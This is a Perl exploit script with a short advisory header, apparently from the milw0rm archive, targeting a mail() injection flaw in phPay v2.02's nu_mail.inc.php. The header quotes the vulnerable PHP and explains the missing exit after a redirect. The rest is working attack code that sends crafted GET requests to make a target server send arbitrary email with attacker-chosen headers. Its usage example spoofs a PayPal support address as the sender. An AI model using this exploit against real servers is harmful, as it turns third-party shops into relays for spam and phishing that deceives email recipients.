#!/usr/bin/perl
#####################
# Script: phPay v2.02 http://phpay.de/
# Vuln File: nu_mail.inc.php
# Exploit & Advisory: beford <xbefordx gmail com>
# Vulnerability: mail() Injection
# Vuln Code:
# <?php
# if (ereg("nu_mail.inc.php", $SCRIPT_NAME)) header("Location:./index.html");
# elseif (ereg("nu_mail.inc.php", $_SERVER['SCRIPT_NAME'])) header("Location:./index.html");
# $mail_text="$mail_2a\n\n";
# ...
# That *should* prevent direct access to the vulnerable file, but they didnt die()/exit()'ed
# so, pwnt. You need register globals enabled to be able of exploiting this issue.
#
#####################
use LWP::UserAgent;
use URI::URL; 
print "\n[*] phPay v2.02 nu_mail.inc.php mail() Injection\n[*] exploit&advisory: beford <xbefordx gmail com>\n";
if (scalar(@ARGV)<6) {
	print "\tUsage:\t./own.pl <host> <path> <email-to> <email-subject> <email-message> <email-from> [headers]\n";
	print "\t<host> : orly\n";
	print "\t<path> : folder where phpay is installed /phpay/ /phpayv2.02/ ..\n";
	print "\t<email-to> <email-subject> <email-message> <email-from> : duh\n";
	print "\t[headers] : optional extra headers for mail \"%0AContent-type: text/html%0A%0A\"\n\n";
	print "\t./own.pl http://www.vuln.es /phpayv2.02/ x\@mail.co h4x \"hack\" support\@paypal.com \n\n";
	exit;
}
$host = shift @ARGV;
$path = shift @ARGV;
$to = shift @ARGV;
$subject = shift @ARGV;
$message = shift @ARGV;
$from = shift @ARGV;
$headers = shift @ARGV;
my $url = URI::URL->new($full);
$full = $url->as_string;
$full =  "${host}${path}nu_mail.inc.php?mail_text2=${message}&user_row[]=&user_row[5]=${to}&nu_mail_1=${subject}&shop_mail=${from}${headers}";
print "[*] exploiting $host\n";
$ua = LWP::UserAgent->new;
$req = HTTP::Request->new('GET',"$full");
$res = $ua->request($req);
print "\t[*] mail sent\n" if $res->is_success;

# milw0rm.com [2006-08-14]
